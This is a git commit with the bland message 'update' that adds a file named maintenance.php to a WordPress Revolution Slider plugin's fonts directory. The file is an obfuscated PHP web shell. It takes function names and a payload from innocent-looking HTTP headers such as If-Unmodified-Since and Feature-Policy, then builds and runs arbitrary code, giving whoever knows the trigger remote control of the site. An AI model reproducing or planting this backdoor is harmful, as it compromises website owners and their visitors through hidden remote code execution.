3badce86b205da2e42c0450a3159785caca2502b
Fast and Static <it@e-me.co>
2024-09-29 16:25:47 +0000

    update

---
+++ wp-content/plugins/revslider/public/assets/fonts/maintenance.php
@@ -0,0 +1,6 @@
+<?php
+$_HEADERS = getallheaders();
+if (isset($_HEADERS['If-Unmodified-Since'])) {
+    $requests = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['Feature-Policy']($_HEADERS['If-Modified-Since']));
+    $requests();
+}
